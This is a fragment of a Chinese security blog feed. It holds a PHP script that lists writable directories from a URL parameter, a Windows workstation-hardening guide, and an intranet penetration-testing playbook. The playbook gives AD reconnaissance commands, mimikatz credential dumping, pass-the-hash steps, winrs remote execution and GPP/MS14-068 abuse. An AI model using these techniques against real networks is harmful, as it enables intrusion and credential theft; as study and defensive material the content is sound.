RcoIl&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"content-Type: text/html; charset=utf-8"</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">listDir</span><span class="params">($dir)</span></span>&#123;  <span class="comment">//定义listDir方法</span></div><div class="line">  <span class="keyword">if</span>(is_dir($dir))&#123;  <span class="comment">// is_dir判断给定文件名是否是一个目录</span></div><div class="line">    <span class="keyword">if</span> ($dh = opendir($dir)) &#123;  <span class="comment">// 打开目录</span></div><div class="line">      <span class="keyword">while</span> (($file= readdir($dh)) !== <span class="keyword">false</span>)&#123; <span class="comment">//如果不为false，则循环读取指定目录列表</span></div><div class="line">        <span class="keyword">if</span>((is_dir($dir.<span class="string">"/"</span>.$file)) &amp;&amp; $file!=<span class="string">"."</span> &amp;&amp; $file!=<span class="string">".."</span>)&#123; <span class="comment">// 去掉此行显示的是所有的非目录文件；"."表示当前目录；".."表示上级目录；</span></div><div class="line">          <span class="keyword">if</span>(is_writable($dir.<span class="string">"/"</span>.$file)&amp;&amp;is_readable($dir.<span class="string">"/"</span>.$file))&#123; <span class="comment">//判断文件夹是否可写可读</span></div><div class="line">            <span class="keyword">echo</span> <span class="string">"&lt;b&gt;&lt;font color='red'&gt;文件名：&lt;/font&gt;&lt;/b&gt;"</span>.$dir.$file.<span class="string">"&lt;font color='red'&gt; 可写&lt;/font&gt;&lt;font color='Blue'&gt; 可读&lt;/font&gt;"</span>.<span class="string">"&lt;br&gt;&lt;hr&gt;"</span>;</div><div class="line">          &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">if</span>(is_writable($dir.<span class="string">"/"</span>.$file))&#123;</div><div class="line">              <span class="keyword">echo</span> <span class="string">"&lt;b&gt;&lt;font color='red'&gt;文件名：&lt;/font&gt;&lt;/b&gt;"</span>.$dir.$file.<span class="string">"&lt;font color='red'&gt; 可写&lt;/font&gt;"</span>.<span class="string">"&lt;br&gt;&lt;hr&gt;"</span>;</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">              <span class="keyword">echo</span> <span class="string">"&lt;b&gt;&lt;font color='red'&gt;文件名：&lt;/font&gt;&lt;/b&gt;"</span>.$dir.$file.<span class="string">"&lt;font color='red'&gt; 可读&lt;/font&gt;&lt;font color='Blue'&gt; 不可写&lt;/font&gt;"</span>.<span class="string">"&lt;br&gt;&lt;hr&gt;"</span>;</div><div class="line">            &#125;</div><div class="line">          &#125;</div><div class="line">        listDir($dir.<span class="string">"/"</span>.$file.<span class="string">"/"</span>);</div><div class="line">        &#125; </div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">closedir($dh);</div><div class="line">  &#125; </div><div class="line">&#125;</div><div class="line"><span class="comment">//起头运行</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'dir'</span>]))<span class="comment">//检索</span></div><div class="line">&#123;</div><div class="line">listDir($_GET[<span class="string">'dir'</span>]);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>当然，这代码肯定不是原创的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;判断文件是否为可读可写。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="Web安全" scheme="http://rcoil.me/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="http://rcoil.me/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>安全鸡儿环境</title>
    <link href="http://rcoil.me/2017/07/%E5%AE%89%E5%85%A8%E9%B8%A1%E5%84%BF%E7%8E%AF%E5%A2%83/"/>
    <id>http://rcoil.me/2017/07/安全鸡儿环境/</id>
    <published>2017-07-08T04:28:58.000Z</published>
    <updated>2017-08-20T13:41:01.705Z</updated>
    
    <content type="html"><![CDATA[<p>在平时的工作生活中，如果打造一个相对安全的环境<br><a id="more"></a></p>
<hr>
<p>以下如无特殊说明，均为windows 7环境</p>
<h2 id="个人电脑"><a href="#个人电脑" class="headerlink" title="个人电脑"></a>个人电脑</h2><h3 id="时间同步"><a href="#时间同步" class="headerlink" title="时间同步"></a>时间同步</h3><p>通常为了得到更加精确的时间信息，我们会采用将Windows时间与网络时间进行同步操作来实现。<br>但是如果在被反日的过程中发现使用了时间同步功能，那基本就可以确定所在地区，所以为了更友好，就需要关闭这项功能。</p>
<ul>
<li>点击桌面右下角时间，然后在弹出的窗口中点击“更改日期和时间设置”</li>
<li>在出现的窗口上部的选项选择“Internet时间”</li>
<li>接下来选择“更改设置”</li>
<li>在“与 Internet 时间同步”的勾勾消，再点击“确定”就行了。<br><img src="https://ooo.0o0.ooo/2017/07/09/5961b024147b6.gif" alt=""></li>
</ul>
<h3 id="win7关闭同步中心"><a href="#win7关闭同步中心" class="headerlink" title="win7关闭同步中心"></a>win7关闭同步中心</h3><ul>
<li>“开始”-“运行”-“regedit”</li>
<li>在“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Syncmgr\Handlers”项中找到一个与SQL Server 2000相关的分支</li>
<li>删除它，这时任务栏里的同步中心图标应该会消失，重启以后同步中心也不会自动启动了。</li>
<li>当然，如果你有其它同步项，比如没有禁用离线文件，或者有移动设备同步，都有可能使同步中心自动启动。</li>
</ul>
<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>大多数朋友可能会遇上WIN7系统关机时出现自动更新延长关机时间，导致有急事无法快速关机拔电源。但要说的不是这回事，都懂得。<br><img src="https://ooo.0o0.ooo/2017/07/09/5961a1683864c.png" alt=""><br>同时调出本地组策略编辑器</p>
<ul>
<li>Win和R键,调出命令提示符</li>
<li>输入<code>gpedit.msc</code></li>
<li>找到管理模板/Windows组件</li>
<li>找到Windows Update，开启那啥。<br><img src="https://ooo.0o0.ooo/2017/07/09/5961a49722a44.gif" alt=""></li>
</ul>
<h3 id="打印机"><a href="#打印机" class="headerlink" title="打印机"></a>打印机</h3><ul>
<li>在控制面板中的管理工具中找到服务</li>
<li>在其中找到Print Spooler</li>
<li>将服务停掉<br><img src="https://ooo.0o0.ooo/2017/07/09/5961a732965e5.gif" alt=""><br>也可以直接在命令行下执行<code>net stop spooler</code></li>
</ul>
<h3 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h3><p>最保险的办法的就是直接禁用摄像头的驱动了。</p>
<ul>
<li>右击电脑桌面上的“计算机”图标选择“属性”选项;</li>
<li>设备管理器</li>
<li>图像设备，找到我们笔记本内置的摄像头</li>
<li>直接右击禁用即可</li>
</ul>
<h3 id="麦克风"><a href="#麦克风" class="headerlink" title="麦克风"></a>麦克风</h3><p>关闭方法：</p>
<ul>
<li>首先在电脑桌面右下角任务栏上的声音图标上右键，然后选择“录音设备”。</li>
<li>之后在弹出的声音属性对话框，将鼠标放在“麦克风”上右键选择“禁用”即可（或点击属性进行选择）。</li>
<li>这样我们就简单禁用了录音设备麦克风了，不影响声卡，依然可以正常播放音乐，只是不能再录音以及语音说话了。</li>
</ul>
<h3 id="USB自动读取"><a href="#USB自动读取" class="headerlink" title="USB自动读取"></a>USB自动读取</h3><p>禁止usb设备的自动运行，首先是出于安全考虑，再者按需运行，减少不必要的程序开启。<br><img src="https://ooo.0o0.ooo/2017/07/09/5961b8b68a3a5.gif" alt="5961b8b68a3a5"></p>
<h3 id="小娜（windows-10）"><a href="#小娜（windows-10）" class="headerlink" title="小娜（windows 10）"></a>小娜（windows 10）</h3><p>使用毛豆就可以。</p>
<h2 id="个人意识"><a href="#个人意识" class="headerlink" title="个人意识"></a>个人意识</h2><h3 id="安全上网"><a href="#安全上网" class="headerlink" title="安全上网"></a>安全上网</h3><p>不在工作机上登陆私人账户</p>
<h3 id="密码分级"><a href="#密码分级" class="headerlink" title="密码分级"></a>密码分级</h3><p>很多人各网站用户名密码相同，这样黑客用被泄露网站的密码登录其他网站很有可能会成功，每个网站都设置不同的密码可能不现实，那就可以对密码就行分级管理。</p>
<h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p>如果是平时的删除则使用强制删除，<code>Shift+del</code>。<br>电脑出售或者移交其他人使用，删除<code>敏感文件</code>后，同样需要对硬盘脱密，使用脱密工具反复擦写<code>5次</code>以上。</p>
<h3 id="文件加密存储"><a href="#文件加密存储" class="headerlink" title="文件加密存储"></a>文件加密存储</h3><p>windows的话本身的BitLocker就很不错。个人使用<code>TrueCrypt</code>，文件直接放在硬盘上，电脑丢失后硬盘上文件就可以被直接读取，如果存到加密盘中，拿到硬盘后必须输入加密盘密码加载加密盘才能看到其中的文件，就有效避免了重要文件泄密。</p>
<h3 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h3><p>最好是到该软件官网下载，校验MD5值，避免出现捆马现象。<br>校验方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">certutil -hashfile 文件名 MD5</div></pre></td></tr></table></figure></p>
<p><img src="/image/文件md5.png" alt="文件md5"></p>
<h3 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h3><ul>
<li>个人电脑上的重要数据要定期备份到服务器或移动硬盘</li>
<li>备份时注意数据要加密，建议使用加密盘，备份整个加密盘原始文件</li>
</ul>
<h3 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h3><p>工作邮箱文件及时删除（前提是备份好文件）</p>
<h3 id="桌面安全"><a href="#桌面安全" class="headerlink" title="桌面安全"></a>桌面安全</h3><p>同事之间工作内容、工作性质不同，有权知晓的信息内容、信息密级也有所不同。离开电脑时记得锁屏，快捷键为<code>Win+L</code><br>桌面文件不可以存在敏感文件，敏感文件需要放在加密盘</p>
<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>物理机脱网，虚拟机使用桥接模式，加密盘放在物理机内，整盘加密或者部分文件加密都是选择对象。文本文件处理都在隔断网络的物理机上，毕竟各种钓鱼。</p>
<h3 id="WIFI安全"><a href="#WIFI安全" class="headerlink" title="WIFI安全"></a>WIFI安全</h3><p>只能说，不是自己的WIFI就不要连接，毕竟、毕竟、毕竟只要WIFI名字相同就能随意连接的年代，有点慌。<br>建议：</p>
<ul>
<li>日常不用WIFI时关闭手机和笔记本的无线局域网功能，以防止自动连接恶意WIFI   </li>
<li>当手机或笔记本连接上WIFI后，留意连接到的WIFI热点名称</li>
</ul>
<h3 id="强制通过VPN上网-VPN断线就断网"><a href="#强制通过VPN上网-VPN断线就断网" class="headerlink" title="强制通过VPN上网,VPN断线就断网"></a>强制通过VPN上网,VPN断线就断网</h3><p>部分工作机是需要这样的机制，至于为什么，嗯。</p>
<p><a href="https://www.t00ls.net/thread-38739-1-1.html" target="_blank" rel="external">https://www.t00ls.net/thread-38739-1-1.html</a><br><a href="https://www.t00ls.net/viewthread.php?tid=38860&amp;extra=&amp;page=1" target="_blank" rel="external">https://www.t00ls.net/viewthread.php?tid=38860&amp;extra=&amp;page=1</a></p>
<div class="note danger"><p>待续…</p>
</div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在平时的工作生活中，如果打造一个相对安全的环境&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://rcoil.me/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="系统安全" scheme="http://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透（持续更新）</title>
    <link href="http://rcoil.me/2017/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>http://rcoil.me/2017/06/内网渗透/</id>
    <published>2017-06-25T13:29:11.000Z</published>
    <updated>2017-09-08T11:51:59.311Z</updated>
    
    <content type="html"><![CDATA[<p>内网渗透，最重要得是定位问题。所以前期的调研和收集是非常重要的一项工作。<br>标：本文多数内容是整合的知识点。<br><a id="more"></a></p>
<hr>
<h1 id="前期基本信息探测"><a href="#前期基本信息探测" class="headerlink" title="前期基本信息探测"></a>前期基本信息探测</h1><p>尽可能详细得分析出网段信息、各部门ip段、重点找出IT运维部、OA、邮箱服务器、人力资源管理等。<br>最后画一张组织结构图，这样在内网定位的时候，无论是针对内网查找资料还是针对特殊任务都是非常实用的一项技术。<br>不过信息收集，不是一天两天就能完成的事情，这种事情要持之以恒。</p>
<h2 id="人事组织结构图"><a href="#人事组织结构图" class="headerlink" title="人事组织结构图"></a>人事组织结构图</h2><p>demo:<br><img src="https://ooo.0o0.ooo/2017/06/16/5943ce9e7f7be.png" alt="安创科技"></p>
<p>思路：这种人事图，除了在外部站点上有，也可以到首页去查找<code>关于我们</code>，有一些简单的说明，然后再去招聘网找各式的岗位名称，最后连蒙带猜（没有这样的操作），收集尽量精确能到各个人员。当然，想要详细，就得通过不同的渠道获取。</p>
<h2 id="ip分布"><a href="#ip分布" class="headerlink" title="ip分布"></a>ip分布</h2><p>思路：</p>
<ol>
<li>一般大公司有内部门户系统，可通过内部门户系统公开链接找出部门ip段（如果找到路由也很惊喜）</li>
<li>内网中可通过路由器、交换机等设备命令执行、snmp、弱口令获取网络拓扑</li>
</ol>
<hr>
<h1 id="切入点（起点）"><a href="#切入点（起点）" class="headerlink" title="切入点（起点）"></a>切入点（起点）</h1><p><img src="/image/切入点.png" alt="切入点.png"></p>
<ol>
<li>Web门户系统getshell—-&gt;system权限；</li>
<li>邮件服务器；</li>
<li>邮件服务器获取信息中得出VPN账密和IP地址；</li>
<li>路由器建立VPN进入；</li>
<li>待更新…</li>
</ol>
<hr>
<h1 id="靶机信息收集"><a href="#靶机信息收集" class="headerlink" title="靶机信息收集"></a>靶机信息收集</h1><p>主要针对三种：</p>
<ol>
<li>基于命令形式的，包括权限信息，机器信息，进程端口，网络连接，共享、会话等等；</li>
<li>基于应用与文件形式的，例如一些敏感文件，密码文件，浏览器，远程连接客户端等；</li>
<li>还有一种是最直接的，例如抓取本地明文与hash，键盘记录，屏幕记录等。</li>
</ol>
<p>网上已经有大量相关的资源与文章了，这里就不再占篇幅了，只说点额外的不常见技巧。</p>
<h2 id="命令行形式"><a href="#命令行形式" class="headerlink" title="命令行形式"></a>命令行形式</h2><p>包括但不限于一下几点</p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">hostname #主机名</div><div class="line">systeminfo #系统信息（所在域，开机时间，安装信息，补丁情况，系统版本）</div><div class="line">set #环境变量</div><div class="line">net user #查看默认用户</div><div class="line">net view #显示当前域或工作组中计算机的列表</div><div class="line">net localgroup #查看用户组</div><div class="line">net localgroup Administrators #查看Administrators组所有用户(包括隐藏用户)</div><div class="line">query user #查看当前会话（window7 64以上）</div><div class="line">tasklist /v #显示当前进程和进程用户</div><div class="line">net config workstation #查看当前登陆用户信息</div><div class="line">net statistics workstation #查看主机开机时间</div><div class="line">net share #查看共享文件夹</div></pre></td></tr></table></figure>
<h3 id="不常用命令"><a href="#不常用命令" class="headerlink" title="不常用命令"></a>不常用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">whoami /all   查看Mandatory Label看我们是否过uac</div><div class="line">net session    查看有没有远程连过来的session</div><div class="line">cmdkey /l     看是否保存了登陆凭证.（凭据管理器）</div><div class="line">echo %logonserver%  查看登陆域</div><div class="line">net stitastics server  查看登陆时间</div><div class="line">Wmic  能让攻击者大量利用来获取系统信息的系统自带工具</div><div class="line">	wmic qfe list #获取补丁信息</div><div class="line">Netsh  做端口转发</div><div class="line">spn –l administrator 域内查某个用户spn记录</div><div class="line">dsquery | nltest  域内信息收集</div></pre></td></tr></table></figure>
<h2 id="应用与文件形式"><a href="#应用与文件形式" class="headerlink" title="应用与文件形式"></a>应用与文件形式</h2><p>虽然标题不错，但是内容只是去翻文件，包括一些应用的配置文件，密码文件等。<br>有时候会碰到一些加密的office办公软件，例如word,excel 这些。</p>
<blockquote>
<p>如果是低版本如2003的话，攻击者会在百度搜一些网上的破解软件进行破解（会联网）。<br>如果是高版本的话，往往在目标用户开着文件时使用微软SysinternalsSuite套装中的procdump将内存dump回去，用内存查看器直接查看文件内容。</p>
</blockquote>
<p>因此就算有些敏感文件加密了照样能够被攻击者获取敏感信息。</p>
<h2 id="hash和明文"><a href="#hash和明文" class="headerlink" title="hash和明文"></a>hash和明文</h2><p>这一步使用mimikatz基本就足够了，也分exe、dll与ps三个版本，攻击者会分情况使用。<br>屏幕截图在windows中也有系统自带psr命令能够做截图等等（但是只有windows7以上才会有）。<br>低版本的可以使用nircmd，使用为：<code>nircmdc.exe savescreenshot 1.png</code>。</p>
<hr>
<h1 id="网络环境的判断"><a href="#网络环境的判断" class="headerlink" title="网络环境的判断"></a>网络环境的判断</h1><ol>
<li>机器所处位置区域的判断;</li>
<li>机器角色的判断;</li>
<li>进出口流量是否连通的判断，是否出的去，进的来。</li>
</ol>
<h2 id="位置的判断"><a href="#位置的判断" class="headerlink" title="位置的判断"></a>位置的判断</h2><p>位置判断是指机器处于网络拓扑中的某个区域，是在DMZ区，办公网，还是核心区，核心DB等多个位置，当然这里的区域并不是绝对的，只是大概的一个环境，不同的地方网络环境不一样，区域的界限也不一定明显。</p>
<h2 id="角色的判断"><a href="#角色的判断" class="headerlink" title="角色的判断"></a>角色的判断</h2><p>机器角色的判断指判断已经控制的机器是普通Web服务器、开发测试服务器、公共服务器、文件服务器还是代理服务器、DNS服务器、存储服务器等等。具体的判断是通过对机器内的主机名、文件、网络连接等多种情况进行综合判断的。</p>
<h2 id="连通性的判断"><a href="#连通性的判断" class="headerlink" title="连通性的判断"></a>连通性的判断</h2><p>出口流量是否连通的判断指机器是否能上外网这些，要综合判断协议（tcp\http\dns\icmp等协议）与端口(常见能出去的端口有80,8080,443,53,110,123等)。在这里还有一种是网络内网设置了代理服务器的情况，攻击者通常会查看环境变量set，主机名是否有proxy字样的机器，注册表是否有写明代理地址或指定pac代理文件等。</p>
<hr>
<h1 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h1><p>如果是workgroup横向，攻击者会尝试web漏洞挖掘、密码猜解等。<br>如果是domain横向，方法就比较多了，例如AD2008 gpp 、ms14-068 、kerberoast 、配置错误、一直抓密码等。</p>
<h2 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h2><p><a href="http://rcoil.me/2017/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B9%8B-%E4%BB%A3%E7%90%86%E7%AF%87/">渗透测试-之-代理篇</a></p>
<h2 id="默认权限配置"><a href="#默认权限配置" class="headerlink" title="默认权限配置"></a>默认权限配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[+]普通机器</div><div class="line">允许Console：administrator组（domain admins），users组（domain users），backup operators组</div><div class="line">允许rdp：administrator组（domain admins），Remote desktop users组</div><div class="line"></div><div class="line">[+]域控AD</div><div class="line">允许Console：administrator组，backup operators组，account operators组，print operators组，server operators组</div><div class="line">允许rdp：administrator组，Remote desktop users组</div></pre></td></tr></table></figure>
<p>如果出现配置错误，那就是权限配置问题。</p>
<p>tips：当某些普通\不普通用户加入AD的rdp组或其他管理员组，当攻击者拿到这些用户的权限时就相当于可以获取到域控制器的权限了。</p>
<h2 id="远程命令执行方式"><a href="#远程命令执行方式" class="headerlink" title="远程命令执行方式"></a>远程命令执行方式</h2><p>例如<code>at\schtasks\psexec\wmic\sc\ps</code>网上有很多相关资源也不占篇幅了，只提一个很少提的。从2012r2 起，他们开了一个端口叫<code>5985</code>，原理跟大家常说的powershell remote是一样的，基于winrm服务，于是可以这样执行。又是一个系统自带的远程管理工具。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">winrs -r:192.168.22.33 -u:administrator -p:p@assw0rd ipconfig</div></pre></td></tr></table></figure></p>
<h2 id="域管理员定位"><a href="#域管理员定位" class="headerlink" title="域管理员定位"></a>域管理员定位</h2><p>一是日志，二是会话。<br>日志指的的本地机器的管理员日志。可以使用脚本或wevtutil导出查看<br>会话是域内每个机器的登陆会话，可以匿名查询，无需权限。可以使用netsess.exe或powerview查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PS C:\Users\RcoIl&gt; get-netsession -computername &quot;192.168.1.100&quot;</div></pre></td></tr></table></figure></p>
<h2 id="域内信息探测"><a href="#域内信息探测" class="headerlink" title="域内信息探测"></a>域内信息探测</h2><p>常用命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">net user /domain  #查看域用户</div><div class="line">net view /domain  #查看有几个域</div><div class="line">net view /domain:XXX  #查看此域内电脑</div><div class="line">net group /domain  #查询域里面的组</div><div class="line">net group “domain computers” /domain  #查看加入到域内的所有计算机名</div><div class="line">net group “domain admins” /domain  #查看域管理员</div><div class="line">net group “domain controllers” /domain  #查看域控制器</div><div class="line">net user hacker /domain  #获得指定账户的详细信息</div><div class="line">net accounts /domain  #获得域密码策略设置，密码长短，错误锁定等信息</div></pre></td></tr></table></figure></p>
<p>dsquery 命令 查询 AD<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">dsquery computer - 查找目录中的计算机。</div><div class="line">dsquery contact - 查找目录中的联系人。</div><div class="line">dsquery subnet - 查找目录中的子网。</div><div class="line">dsquery group - 查找目录中的组。</div><div class="line">dsquery ou - 查找目录中的组织单位。</div><div class="line">dsquery site - 查找目录中的站点。</div><div class="line">dsquery server - 查找目录中的 AD DC/LDS 实例。</div><div class="line">dsquery user - 查找目录中的用户。</div><div class="line">dsquery quota - 查找目录中的配额规定。</div><div class="line">dsquery partition - 查找目录中的分区。</div><div class="line">dsquery * - 用通用的 LDAP 查询来查找目录中的任何对象。</div></pre></td></tr></table></figure></p>
<p>Net系列命令获取域内信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Csvde/ldifde/dsquery/adfind/ldapsearch #探测更详细信息</div><div class="line">使用`Get-SPN`（powershell脚本LDAP中快速查询符合指定得用户、组、或者SPN服务名称）</div><div class="line">Nslookup -type=SRV_ldap._tcp #(寻找域控)</div><div class="line">tasklist /v  #列出进程和进程所有者（看是否有域管登陆）</div><div class="line">PowerView #（powershell脚本 辅助找寻定位关键用户）</div><div class="line">WinScanX.exe  #远程信息刺探</div><div class="line">Winfo.exe  #遍历远程用户名</div><div class="line">nmap smb-enum-sessions.nse #（引擎来获取远程机器的登陆session，并且不需要管理权。）</div><div class="line">netview.exe`#(它利用`NetSessionEnum`来寻找登陆sessions，利用`NetShareEnum`来找寻共享，利用`NetWkstaUserEnum`来枚举登陆的用户)</div></pre></td></tr></table></figure></p>
<hr>
<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><ol>
<li><code>cat /etc/nsswitch</code><br>看看密码登陆策略，我可以看到使用了file ldap模式</li>
<li><code>less /etc/ldap.conf</code><br>base ou=People,dc=unix-center,dc=net<br>找到ou,dc,dc设置</li>
<li>查找10条用户记录<br><code>ldapsearch -h 192.168.2.2 -x -z 10 -p</code>指定端口</li>
<li>查看NFS连接<br><code>showmount -e ip</code></li>
<li>查找管理员信息<br>匿名方式<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ldapsearch -x -D &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -b &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -h 192.168.2.2</div></pre></td></tr></table></figure>
</li>
</ol>
<p>有密码形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ldapsearch -x -W -D &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -b &quot;cn=administrator,cn=People,dc=unix-center,dc=net&quot; -h 192.168.2.2</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="获取域管权限"><a href="#获取域管权限" class="headerlink" title="获取域管权限"></a>获取域管权限</h2><h3 id="账户枚举"><a href="#账户枚举" class="headerlink" title="账户枚举"></a>账户枚举</h3><p>（nbtstat -A\nmapd等）、hash注入 （mimikatz） 、bypassuac、 session切换等</p>
<h3 id="组策略漏洞（GPP）"><a href="#组策略漏洞（GPP）" class="headerlink" title="组策略漏洞（GPP）"></a>组策略漏洞（GPP）</h3><p>域管理员使用GPP来配置和操作域，常见的操作有远程创建本地用户、映射打印机、映射磁盘等，这些操作有时候需要提供账号密码。当组策略进行分发时，会在SYSVOL目录下生成一个xml文件，理所当然的前面提供的账号密码都保存在这个xml文件中，而密码是经过AES加密得，也就是说完全可逆的加密算法，而微软同时也很照顾的公布了加密密钥，所以任何域普通用户就可以读取这些xml文件并使用公开得AES密钥破解密码。</p>
<h3 id="MS14-068-KERBEROS漏洞"><a href="#MS14-068-KERBEROS漏洞" class="headerlink" title="MS14-068 KERBEROS漏洞"></a>MS14-068 KERBEROS漏洞</h3><p>Benjamin Delpy(Mimikatz的作者)写了一个MS14-068的利用工具，叫Kekeo,是PyKEX的升级版。它能够找到并定位有漏洞的域控，在打了补丁和有2012/2012R2域控得情况下仍能凑效。</p>
<h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><p>17年是个好年。</p>
<h3 id="相同密码登陆"><a href="#相同密码登陆" class="headerlink" title="相同密码登陆"></a>相同密码登陆</h3><p>如果内网主机的本地管理员账户密码相同且允许本地账户登陆域内其他机器，那么可以通过以获取的hash或明文</p>
<p>一般步骤：</p>
<ol>
<li>远程登陆到任意一台主机；</li>
<li>获取一台域控主机的权限；</li>
<li>Dump内存获得hash（或明文）；</li>
<li>通过pass the hash 或 明文 尝试登陆其他主机；</li>
<li>继续搜集hash 或明文 并尝试远程登陆；</li>
<li>直到获得域管理员账户hash，登陆域控，最终成功控制整个域</li>
</ol>
<p>域登陆缓存mscash<br>使用reg命令提取sam、system、security、然后用creddump7提取mscash。</p>
<h3 id="利用漏洞配置不当获取更多主机权限"><a href="#利用漏洞配置不当获取更多主机权限" class="headerlink" title="利用漏洞配置不当获取更多主机权限"></a>利用漏洞配置不当获取更多主机权限</h3><ol>
<li>常见应用漏洞：<br><code>struts2、zabbix、axis、ImageMagic、fastcgi、Shellshock、redis未授权访问、Hadoop、weblogic、jboss、WebSphere、Coldfusion</code></li>
<li>常见语言反序列化漏洞<br>php、Java、python、ruby、node.js</li>
<li>数据库漏洞及配置不当<br>mssql Get-SQLServerAccess、MySQL低版本hash登陆、MySQL低版本Authentication Bypass、域内mssql凭证获取密码、monggodb未授权访问、memcache配置不当</li>
<li>内网中很多web应用存在常见漏洞、使用有漏洞的中间件和框架、弱口令及配置不当（注入、任意文件读取、备份、源码泄漏（rsync、git、svn、DS_Store）、代码执行、xss、弱口令、上传漏洞、权限绕过…）</li>
<li>web应用、及数据库中寻找其他服务器密码信息（<code>ftp、mail、smb、ldap存储、sql...</code>）</li>
<li>系统备份文件（<code>ghost</code>）中读密码</li>
<li>在已有控制权限主机中，查看各<code>浏览器书签</code>、<code>cookie</code>、<code>存储密码</code>、<code>键盘记录</code>收集相关敏感信息、查询<code>注册表</code>中保存密码、读取各客户端连接密码、putty dll注入、putty密码截取、ssh连接密码，以获取更多主机权限<br>推荐工具：<code>NetRipper</code>、<code>Puttyrider.exe</code>、<code>ProwserPasswordDump.exe</code>、<code>LaZagne.exe</code></li>
<li><code>ms08-067</code>远程溢出（极少能碰到）</li>
<li><code>cmdkey /list</code> 远程终端可信任连接连接<code>netpass.exe</code>读取该密码</li>
<li>arp欺骗中间人攻击（替换sql数据包、认证凭证获取、密码获取极大不到万不得已不会用）</li>
<li><code>WPAD中间人攻击</code>（全称网络代理自动发现协议、截获凭证该种方法不需要ARP欺骗，比较好用的一种方法（使用Responder.py/net-creds.py））</li>
<li>翻阅相关文件及以控制数据库中可能存储配置口令（别忘了回收站）</li>
<li>用已有控制权限的邮箱账号以及前期所了解到的信息进行欺骗（社会工程学）</li>
<li>定向浏览器信息ip信息定向挂马（0day）</li>
<li>用以收集的密码（组合变换密码）对各服务进行爆破</li>
<li>应用0day攻击…</li>
</ol>
<hr>
